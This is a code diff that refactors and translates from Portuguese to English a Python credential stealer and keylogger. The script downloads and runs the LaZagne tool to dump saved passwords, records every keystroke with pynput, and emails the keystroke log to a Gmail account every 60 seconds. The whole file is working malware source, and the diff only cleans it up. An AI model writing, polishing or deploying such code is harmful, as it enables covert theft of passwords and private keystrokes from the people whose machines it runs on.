@@ -1,84 +1,84 @@
-import pynput.keyboard, threading, sys, requests, smtplib, subprocess, os, tempfile, webbrowser, pyautogui
+import pynput.keyboard
+import threading
+import sys
+import requests
+import smtplib
+import subprocess
+import os
+import tempfile
+import webbrowser
+import pyautogui
 
 url = 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe'
-#email = 'x'
-#senha = Senha do aplicativo
 
 
 def download(url):
-    diretoriotemp = tempfile.gettempdir()
-    os.chdir(diretoriotemp)
+    tempdir = tempfile.gettempdir()
+    os.chdir(tempdir)
     req = requests.get(url)
-    nome = url.split('/')[-1]
-    with open(nome, 'wb') as f:
+    filename = url.split('/')[-1]
+    with open(filename, 'wb') as f:
         f.write(req.content)
 
 
-def extrair():
-    comando = 'laZagne.exe all'
-    global mensagem
-    mensagem = subprocess.check_output(comando, shell=True)
+def extract():
+    command = 'laZagne.exe all'
+    global message
+    message = subprocess.check_output(command, shell=True)
     os.remove('laZagne.exe')
 
 
-def enviaremail(email, senha, mensagem):
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(email, senha)
-    server.sendmail(email, email, mensagem)
-
-
 class Keylogger:
-    def __init__(self, tempo, email, senha):
-        self.log = 'Iniciado'
-        self.tempo = tempo
+    def __init__(self, interval, email, password):
+        self.log = 'Started'
+        self.interval = interval
         self.email = email
-        self.senha = senha
+        self.password = password
 
-    def addlog(self, string):
-        self.log = self.log + string
+    def add_log(self, string):
+        self.log += string
 
-    def apertou(self, tecla):
+    def on_press(self, key):
         try:
-            contlog = str(tecla.char)
+            logged_key = str(key.char)
         except AttributeError:
-            if str(tecla) == 'Key.space':
-                contlog = ' '
-            elif str(tecla) == 'Key.backspace':
-                contlog = ' <--(Apagou algo)'
+            if str(key) == 'Key.space':
+                logged_key = ' '
+            elif str(key) == 'Key.backspace':
+                logged_key = ' <--(Deleted something)'
             else:
-                contlog = " " + str(tecla) + " "
-        self.addlog(contlog)
+                logged_key = " " + str(key) + " "
+        self.add_log(logged_key)
 
-    def enviar(self):
-        self.configemail(self.email, self.senha, self.log)
+    def send_logs(self):
+        self.configure_email(self.email, self.password, self.log)
         self.log = ''
-        timer = threading.Timer(self.tempo, self.enviar)
+        timer = threading.Timer(self.interval, self.send_logs)
         timer.start()
 
-    def configemail(self, email, senha, mensagem):
-        server = smtplib.SMTP("smtp.gmail.com", 587)
-        server.starttls()
-        server.login(self.email, self.senha)
-        server.sendmail(self.email, self.email, mensagem)
-        server.quit()
+    def configure_email(self, email, password, message):
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login(email, password)
+            server.sendmail(email, email, message)
 
-    def iniciar(self):
-        escuta = pynput.keyboard.Listener(on_press=self.apertou)
-        with escuta:
-            self.enviar()
-            escuta.join()
+    def start(self):
+        listener = pynput.keyboard.Listener(on_press=self.on_press)
+        with listener:
+            self.send_logs()
+            listener.join()
 
-
-key = Keylogger(60, email, senha)
 
 if __name__ == "__main__":
     try:
+        # Passe as credenciais de e-mail e senha aqui
+        email = 'your_email@gmail.com'
+        password = 'your_password'
+        
         download(url)
-        extrair()
-        enviaremail(email, senha, mensagem)
-        key.iniciar()
-    except:
+        extract()
+        keylogger = Keylogger(60, email, password)
+        keylogger.start()
+    except Exception as e:
+        print(f"An error occurred: {e}")
         sys.exit()
-
-
